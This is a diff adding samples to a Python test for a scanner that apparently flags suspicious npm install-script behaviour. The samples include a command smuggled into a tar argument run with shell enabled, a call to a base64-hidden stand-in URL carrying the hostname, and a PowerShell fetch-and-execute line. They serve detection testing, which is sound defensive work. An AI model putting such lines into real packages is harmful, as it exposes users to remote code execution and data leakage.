@@ -197,6 +197,7 @@ def test_s6_own_binary_download_not_run() -> None:
         b'execFileSync("curl", ["-o", f, url]);',
         b'execFileSync("powershell", ["-Command", "iex (irm x)"]);',
         b"execFileSync(cmd, args);",
+        b'execFileSync("tar", ["-xf", "a; ./bin/tool init"], { shell: true });',
         b'const run = execFileSync; run("tar", ["-xf", f]);',
     ):
         assert shape(change({"install.js": FETCHER + run}, manifest)) is None, run
@@ -216,6 +217,8 @@ def test_s6_own_binary_download_not_run() -> None:
         b'https.request({ host: "github.com", method: "POST" });',
         b'new (require("worker_threads").Worker)(file);',
         b'require("./bin/tool.js");',  # a file it doesn't ship: maybe what it downloaded
+        b'https.get(atob("aHR0cHM6Ly94LmludmFsaWQv") + os.hostname());',  # a hidden URL
+        b'const u = Buffer.from(s, "base64").toString();',
         # Writing it into another package, a system directory or the user's project.
         b'fs.copyFileSync(f, path.join(root, "node_modules", "esbuild", "bin", "esbuild"));',
         b'fs.copyFileSync(f, require.resolve("dep/bin/x"));',
